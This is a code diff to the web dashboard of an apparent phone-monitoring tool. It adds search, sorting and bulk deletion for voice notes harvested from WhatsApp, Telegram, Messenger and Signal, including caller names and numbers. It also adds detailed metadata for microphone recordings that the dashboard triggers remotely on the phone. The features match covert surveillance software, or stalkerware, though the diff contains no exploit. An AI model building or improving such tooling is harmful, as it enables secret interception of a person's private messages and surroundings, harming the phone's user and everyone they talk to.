@@ -433,7 +433,24 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <input type="text" id="contactsSearch" placeholder="&#x1F50D; Search contacts..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
-<div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
+<div id="tab-voice">
+<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+<span style="font-size:13px;font-weight:500;color:var(--text)">&#x1F3A4; Voice Notes</span>
+<span id="voiceDeviceLabel" class="vmeta" style="background:var(--card);padding:2px 8px;border-radius:10px;border:1px solid var(--border)"></span>
+<span id="voiceCountBadge" class="vmeta" style="display:none;background:var(--accent);color:#000;padding:2px 8px;border-radius:10px"></span>
+<input id="voiceSearch" type="text" placeholder="Search filename..." style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:150px" oninput="renderVoiceNotes()">
+<select id="voiceSort" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px" onchange="renderVoiceNotes()">
+<option value="newest">Newest first</option>
+<option value="oldest">Oldest first</option>
+</select>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" id="btnSelectAllVoice">&#x1F4CB; Select All</span>
+<span class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:11px;cursor:pointer" id="btnDeleteSelectedVoice" onclick="deleteSelectedVoiceNotes()">&#x1F5D1; Delete Selected</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer;margin-left:auto" onclick="pollVoiceNotes()">&#x1F504; Refresh</span>
+</div>
+<div id="voiceHintBanner" style="display:none;font-size:12px;color:var(--warning);background:var(--card);border:1px solid var(--warning);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px"></div>
+<div id="voiceStatusLine" style="font-size:12px;color:var(--muted);margin-bottom:6px"></div>
+<div id="voiceNotesList"><div class="label">No voice notes yet</div></div>
+</div>
 <div id="tab-remote">
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
@@ -481,6 +498,7 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(1)">&#x1F5D1; Cleanup older than 1 day</button>
 </div>
 
+<div id="remoteHintBanner" style="display:none;font-size:12px;color:var(--warning);background:var(--card);border:1px solid var(--warning);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px"></div>
 <div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
 </div>
 <div id="tab-insights">
@@ -1062,8 +1080,42 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
     if (btn.dataset.tab === 'health') pollHealth();
+    if (btn.dataset.tab === 'voice') pollVoiceNotes();
+    if (btn.dataset.tab === 'remote') pollRemoteRecordings();
   });
 });
+
+function switchTab(name) {
+  const btn = document.querySelector('.tab-btn[data-tab="' + name + '"]');
+  if (btn) btn.click();
+}
+
+function deviceLabelFor(id) {
+  const d = devices[id];
+  return d ? d.label : (id || '').slice(0, 8);
+}
+
+function switchDevice(id) {
+  const sel = document.getElementById('deviceSelect');
+  if (!sel) return;
+  sel.value = id;
+  sel.dispatchEvent(new Event('change'));
+}
+
+function parseViewerDate(s) {
+  if (!s) return 0;
+  if (typeof s === 'number') return s;
+  const n = Date.parse(s);
+  if (!isNaN(n)) return n;
+  const m = /^(\d{4})-(\d{2})-(\d{2}) (\d{2}):(\d{2}):(\d{2}) ([AP]M)$/.exec(String(s).trim());
+  if (m) {
+    let h = parseInt(m[4], 10);
+    if (m[7] === 'PM' && h < 12) h += 12;
+    if (m[7] === 'AM' && h === 12) h = 0;
+    return new Date(+m[1], +m[2] - 1, +m[3], h, +m[5], +m[6]).getTime();
+  }
+  return 0;
+}
 
 // --- Tab-aware polling ---
 document.addEventListener('visibilitychange', () => {
@@ -1481,10 +1533,10 @@ function startPolling() {
 
 function schedulePoll(name, interval, fn) {
   async function run() {
-    try { await fn(); } catch {}
+    try { await fn(); } catch (e) { console.error('poll [' + name + '] error:', e); }
     if (!document.hidden) pollTimers.push(setTimeout(run, interval));
   }
-  pollTimers.push(setTimeout(run, interval));
+  run();
 }
 
 async function pollAll() {
@@ -1545,7 +1597,7 @@ async function fetchDevices() {
   const active = [];
   for (const id of ids) {
     const ts = await fetchRTDB(`devices/${id}/metrics/latest/timestamp`);
-    if (ts) active.push({ id, ts: Date.parse(ts) || 0 });
+    if (ts) active.push({ id, ts: parseViewerDate(ts) });
   }
   active.sort((a, b) => b.ts - a.ts);
   if (!active.length) {
@@ -2244,16 +2296,32 @@ function noteStableId(note) {
   return (note.fileName || '') + '_' + (note.dateAdded || '0');
 }
 
+let voiceNotesCache = [];
+let voiceSelectedKeys = new Set();
+
+function jsStr(s) {
+  return String(s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+}
+
+function deriveSourceApp(note) {
+  if (note.sourceApp) return note.sourceApp;
+  const n = (note.fileName || '').toLowerCase();
+  if (/^(ptt|aud)-/.test(n)) return 'WhatsApp';
+  if (n.indexOf('telegram') !== -1) return 'Telegram';
+  return 'Other';
+}
+
 async function pollVoiceNotes() {
   if (!selectedDevice) return;
-  const list = document.getElementById('voiceNotesList');
+  const devLabel = document.getElementById('voiceDeviceLabel');
+  if (devLabel) devLabel.textContent = deviceLabelFor(selectedDevice);
   let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  voiceNotesCache = [];
   if (!data || typeof data !== 'object') {
-    list.innerHTML = '<div class="label">No voice notes found on phone</div><div style="font-size:12px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
+    renderVoiceNotes();
+    maybeVoiceHint();
     return;
   }
-  // Collect every note across all batches, keeping the batch sync time.
-  const notes = [];
   for (const key of Object.keys(data)) {
     const batch = data[key];
     if (!batch || typeof batch !== 'object') continue;
@@ -2262,13 +2330,31 @@ async function pollVoiceNotes() {
       const note = batch.notes[ni];
       if (!note) continue;
       if (note.isCallRecording) continue;
-      notes.push(Object.assign({ _synced: synced, _batchKey: key, _noteIndex: ni, _stableId: noteStableId(note) }, note));
+      voiceNotesCache.push(Object.assign({ _synced: synced, _batchKey: key, _noteIndex: ni, _stableId: noteStableId(note) }, note));
     }
   }
-  // Newest created/captured first.
-  notes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  renderVoiceNotes();
+  maybeVoiceHint();
+}
+
+function renderVoiceNotes() {
+  const list = document.getElementById('voiceNotesList');
+  if (!list) return;
+  const countBadge = document.getElementById('voiceCountBadge');
+  const search = (document.getElementById('voiceSearch')?.value || '').trim().toLowerCase();
+  const sortDir = document.getElementById('voiceSort')?.value || 'newest';
+  let notes = voiceNotesCache.filter(n => !search || (n.fileName || '').toLowerCase().indexOf(search) !== -1);
+  notes.sort((a, b) => sortDir === 'oldest'
+    ? (parseInt(a.dateAdded) || 0) - (parseInt(b.dateAdded) || 0)
+    : (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  if (countBadge) {
+    const shown = notes.length, total = voiceNotesCache.length;
+    countBadge.textContent = total ? (shown === total ? total + ' note' + (total > 1 ? 's' : '') : shown + '/' + total + ' notes') : '';
+    countBadge.style.display = total ? '' : 'none';
+  }
   if (!notes.length) {
-    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    list.innerHTML = '<div class="label">' + (voiceNotesCache.length ? 'No notes match the search' : 'No voice notes yet') + '</div><div style="font-size:12px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
+    updateVoiceSelectionUI();
     return;
   }
   const MIME = {
@@ -2278,9 +2364,13 @@ async function pollVoiceNotes() {
     'audio/amr': 'audio/amr', 'audio/wav': 'audio/wav', 'audio/x-wav': 'audio/wav',
     'audio/webm': 'audio/webm', 'audio/aac': 'audio/mp4'
   };
-let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${notes.length} voice note${notes.length>1?'s':''} \u2022 newest first</div>`;
+  let html = '';
   for (const note of notes) {
     const name = note.fileName || 'Voice note';
+    const stableId = jsStr(note._stableId);
+    const checked = voiceSelectedKeys.has(note._stableId) ? ' checked' : '';
+    const selectedStyle = voiceSelectedKeys.has(note._stableId) ? 'outline:1px solid var(--accent);' : '';
+    const srcApp = escHtml(deriveSourceApp(note));
     const caller = note.callerName ? (note.callDirection === 'incoming' ? '\u2B05 ' : '\u27A1 ') + escHtml(note.callerName) + (note.callerNumber ? ' (' + escHtml(note.callerNumber) + ')' : '') : '';
     const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
     const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
@@ -2288,6 +2378,7 @@ let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${n
     const synced = note._synced ? pkt(note._synced) : '';
     const type = (note.mimeType || '').split('/').pop().toUpperCase() || 'AUDIO';
     const metaBits = [created ? `Captured: ${created}` : '', dur ? `Duration: ${dur}` : '', size ? `Size: ${size}` : '', `Type: ${type}`];
+    if (note.folderPath) metaBits.push('Folder: ' + escHtml(note.folderPath));
     const meta = metaBits.filter(Boolean).join('  \u2022  ');
     const syncedLine = synced ? `<div class="vmeta">Synced: ${synced}</div>` : '';
     let player = '';
@@ -2319,16 +2410,144 @@ let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${n
       player = `<div class="vmeta" style="color:var(--danger)">${reason}</div>`;
       audioStatus = '<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF Unavailable</span>';
     }
-    html += `<div class="voice-card">
-      <div class="vname">${name} ${audioStatus}${downloadLink}</div>
+    html += `<div class="voice-card" style="${selectedStyle}border:1px solid var(--border);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px;background:var(--card)">
+      <div class="vname" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
+        <label class="voice-select" style="display:inline-flex;align-items:center;cursor:pointer"><input type="checkbox"${checked} onchange="toggleVoiceSelect(this, '${stableId}')"></label>
+        <span class="vmeta" style="background:var(--accent);color:#000;padding:1px 6px;border-radius:8px;font-size:9px;font-weight:600">${srcApp}</span>
+        <span style="font-weight:600">${name}</span> ${audioStatus}${downloadLink}
+      </div>
       ${caller ? `<div class="vmeta" style="color:var(--accent)">${caller}</div>` : ''}
       ${meta ? `<div class="vmeta">${meta}</div>` : ''}
       ${syncedLine}
       ${player}
-      <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-top:4px" onclick="deleteVoiceNoteByStableId('${note._stableId}')">\u{1F5D1} Delete</button>
+      <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-top:4px" onclick="deleteVoiceNoteByStableId('${stableId}')">\u{1F5D1} Delete</button>
     </div>`;
   }
   list.innerHTML = html;
+  updateVoiceSelectionUI();
+}
+
+function updateVoiceSelectionUI() {
+  const del = document.getElementById('btnDeleteSelectedVoice');
+  if (del) del.textContent = '\u{1F5D1} Delete Selected' + (voiceSelectedKeys.size ? ' (' + voiceSelectedKeys.size + ')' : '');
+  const sel = document.getElementById('btnSelectAllVoice');
+  if (sel) sel.textContent = voiceSelectedKeys.size && voiceNotesCache.length && voiceSelectedKeys.size >= voiceNotesCache.length ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
+}
+
+function toggleVoiceSelect(el, stableId) {
+  const wrap = el.closest('.voice-card');
+  if (!wrap) return;
+  if (el.checked) voiceSelectedKeys.add(stableId);
+  else voiceSelectedKeys.delete(stableId);
+  updateVoiceSelectionUI();
+  const card = document.querySelectorAll('.voice-card');
+  card.forEach(c => {
+    const cb = c.querySelector('input[type=checkbox]');
+    if (cb && cb.checked) c.style.outline = '1px solid var(--accent)';
+    else if (cb) c.style.outline = '';
+  });
+}
+
+document.getElementById('btnSelectAllVoice')?.addEventListener('click', function() {
+  const total = voiceNotesCache.length;
+  const selecting = voiceSelectedKeys.size < total;
+  voiceSelectedKeys.clear();
+  if (selecting) voiceNotesCache.forEach(n => voiceSelectedKeys.add(n._stableId));
+  updateVoiceSelectionUI();
+  renderVoiceNotes();
+});
+
+async function deleteVoiceNotes(keys) {
+  if (!selectedDevice || !keys.size) return 0;
+  const byBatch = {};
+  for (const n of voiceNotesCache) {
+    if (keys.has(n._stableId)) {
+      (byBatch[n._batchKey] = byBatch[n._batchKey] || []).push(n._stableId);
+    }
+  }
+  let deleted = 0;
+  for (const batchKey of Object.keys(byBatch)) {
+    try {
+      const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+      if (!batch || !batch.notes) continue;
+      const ids = new Set(byBatch[batchKey]);
+      const before = batch.notes.length;
+      batch.notes = batch.notes.filter(note => {
+        if (!note) return false;
+        return !ids.has(noteStableId(note));
+      });
+      const removed = before - batch.notes.length;
+      deleted += removed;
+      batch.totalCount = batch.notes.length;
+      if (batch.notes.length === 0) {
+        await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+      } else {
+        await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+          method: 'PUT', body: JSON.stringify(batch)
+        });
+      }
+    } catch (e) {
+      console.error('deleteVoiceNotes batch ' + batchKey + ' failed:', e);
+    }
+  }
+  return deleted;
+}
+
+async function deleteVoiceNoteByStableId(stableId) {
+  if (!confirm('Delete this voice note from RTDB?')) return;
+  const deleted = await deleteVoiceNotes(new Set([stableId]));
+  if (deleted > 0) {
+    showAlert('Deleted voice note', 'warn');
+    voiceSelectedKeys.clear();
+    await pollVoiceNotes();
+    refreshStorage();
+  } else {
+    showAlert('Delete failed: note not found', 'error');
+  }
+}
+
+async function deleteSelectedVoiceNotes() {
+  if (!voiceSelectedKeys.size) { showAlert('No voice notes selected', 'error'); return; }
+  if (!confirm('Delete ' + voiceSelectedKeys.size + ' selected voice notes from RTDB?\nThis cannot be undone.')) return;
+  const deleted = await deleteVoiceNotes(voiceSelectedKeys);
+  voiceSelectedKeys.clear();
+  updateVoiceSelectionUI();
+  await pollVoiceNotes();
+  refreshStorage();
+  showAlert('Deleted ' + deleted + ' voice notes', deleted > 0 ? 'warn' : 'error');
+}
+
+async function findDeviceWithData(path, shallowKey) {
+  const keys = await fetchRTDB('devices', 'shallow=true');
+  if (!keys || typeof keys !== 'object') return null;
+  const cands = [];
+  for (const id of Object.keys(keys)) {
+    try {
+      const d = await fetchRTDB(`devices/${id}/${path}`, 'shallow=true');
+      if (d && typeof d === 'object' && Object.keys(d).length) {
+        cands.push({ id, count: Object.keys(d).length });
+      }
+    } catch {}
+  }
+  if (!cands.length) return null;
+  cands.sort((a, b) => b.count - a.count);
+  return cands[0];
+}
+
+async function maybeVoiceHint() {
+  const banner = document.getElementById('voiceHintBanner');
+  if (!banner) return;
+  if (voiceNotesCache.length || !selectedDevice) { banner.style.display = 'none'; return; }
+  const alt = await findDeviceWithData('voice_notes', true);
+  if (alt && alt.id !== selectedDevice) {
+    banner.style.display = 'block';
+    banner.innerHTML = 'No voice notes on <b>' + escHtml(deviceLabelFor(selectedDevice)) + '</b>. '
+      + '<b>' + alt.count + ' batch' + (alt.count > 1 ? 'es' : '') + '</b> found on '
+      + escHtml(deviceLabelFor(alt.id))
+      + ' — <span style="color:var(--accent);cursor:pointer;text-decoration:underline" onclick="switchDevice(\'' + jsStr(alt.id) + '\')">switch now</span>.';
+  } else {
+    banner.style.display = 'none';
+  }
 }
 
 async function fetchAllParts(deviceId, recId) {
@@ -2367,13 +2586,16 @@ async function pollRemoteRecordings() {
   try { data = await fetchRTDB(`devices/${deviceId}/recordings`, 'shallow=true'); } catch { data = null; }
   if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
+    maybeRemoteHint();
     return;
   }
   const recIds = Object.keys(data);
   if (!recIds.length) {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
+    maybeRemoteHint();
     return;
   }
+  document.getElementById('remoteHintBanner')?.style ? (document.getElementById('remoteHintBanner').style.display = 'none') : 0;
   const MIME = {
     'audio/ogg': 'audio/ogg', 'application/ogg': 'audio/ogg', 'audio/opus': 'audio/ogg',
     'audio/mpeg': 'audio/mpeg', 'audio/mp3': 'audio/mpeg',
@@ -2391,8 +2613,11 @@ async function pollRemoteRecordings() {
       recData = recData.meta;
     }
     const recIdKey = recId;
-    const createdAt = recData.createdAt ? new Date(recData.createdAt).toLocaleString() : '';
+    const createdAtMs = recData.startedAtMs || recData.createdAt;
+    const createdAt = createdAtMs ? new Date(createdAtMs).toLocaleString() : '';
     const duration = recData.durationSec || 0;
+    const recordedDur = recData.recordedDurationSec || 0;
+    const requestedDur = recData.requestedDurationSec || 0;
     const mimeType = recData.mimeType || 'audio/mp4';
     const sizeMb = recData.sizeBytes ? (recData.sizeBytes / (1024 * 1024)).toFixed(2) : '0';
     const mt = MIME[mimeType] || 'audio/mp4';
@@ -2411,15 +2636,42 @@ async function pollRemoteRecordings() {
     } else {
       status = `<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF No audio data</span>`;
     }
+    const metaBits = [createdAt ? `Started: ${createdAt}` : '', `Duration: ${recordedDur || duration}s`];
+    if (requestedDur) metaBits.push(`Requested: ${requestedDur}s`);
+    if (recData.audioSource) metaBits.push(`Source: ${escHtml(recData.audioSource)}`);
+    if (recData.sampleRate) metaBits.push(`Rate: ${recData.sampleRate}`);
+    if (recData.bitRate) metaBits.push(`Bitrate: ${recData.bitRate}k`);
+    if (typeof recData.batteryStart === 'number') metaBits.push(`Battery: ${recData.batteryStart}%`);
+    if (recData.networkType) metaBits.push(`Net: ${escHtml(recData.networkType)}`);
+    metaBits.push(`Size: ${sizeMb}MB`, `Parts: ${parts.length}`, `Type: ${mt}`);
+    if (recData.status) metaBits.push('Status: ' + escHtml(recData.status));
+    const meta = metaBits.filter(Boolean).join('  \u2022  ');
     html += `<div class="voice-card">
       <div class="vname">&#x1F3A4; Recording ${recIdKey.substring(0, 8)}... ${status}
         <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${recIdKey}')">\u{1F5D1}</button>
       </div>
-      <div class="vmeta">Created: ${createdAt}  \u2022  Duration: ${duration}s  \u2022  Parts: ${parts.length}  \u2022  Size: ${sizeMb}MB  \u2022  Type: ${mt}</div>
+      <div class="vmeta">${meta}</div>
       ${player}
     </div>`;
   }
   list.innerHTML = html;
+}
+
+async function maybeRemoteHint() {
+  const banner = document.getElementById('remoteHintBanner');
+  if (!banner) return;
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) { banner.style.display = 'none'; return; }
+  const alt = await findDeviceWithData('recordings', true);
+  if (alt && alt.id !== deviceId) {
+    banner.style.display = 'block';
+    banner.innerHTML = 'No remote recordings on <b>' + escHtml(deviceLabelFor(deviceId)) + '</b>. '
+      + '<b>' + alt.count + ' recording' + (alt.count > 1 ? 's' : '') + '</b> found on '
+      + escHtml(deviceLabelFor(alt.id))
+      + ' — <span style="color:var(--accent);cursor:pointer;text-decoration:underline" onclick="switchDevice(\'' + jsStr(alt.id) + '\')">switch now</span>.';
+  } else {
+    banner.style.display = 'none';
+  }
 }
 
 // --- Remote Recording Commands ---
@@ -4675,41 +4927,6 @@ async function deleteRecording(recordingId) {
     showAlert('Recording deleted', 'warn');
     pollRemoteRecordings();
   } catch (e) { showAlert('Delete failed: ' + e.message, 'error'); }
-}
-
-async function deleteVoiceNoteByStableId(stableId) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
-  const data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
-  if (!data || typeof data !== 'object') { showAlert('No voice notes found', 'error'); return; }
-  for (const batchKey of Object.keys(data)) {
-    const batch = data[batchKey];
-    if (!batch || !batch.notes) continue;
-    for (let i = batch.notes.length - 1; i >= 0; i--) {
-      const note = batch.notes[i];
-      if (!note) continue;
-      if (noteStableId(note) === stableId) {
-        batch.notes.splice(i, 1);
-        batch.totalCount = batch.notes.length;
-        try {
-          if (batch.notes.length === 0) {
-            await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
-          } else {
-            await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
-              method: 'PUT',
-              body: JSON.stringify(batch)
-            });
-          }
-          showAlert('Deleted voice note: ' + (note.fileName || 'unknown'), 'warn');
-        } catch (e) {
-          showAlert('Delete failed: ' + e.message, 'error');
-        }
-        pollVoiceNotes();
-        refreshStorage();
-        return;
-      }
-    }
-  }
-  showAlert('Voice note not found', 'error');
 }
 
 // --- Init ---
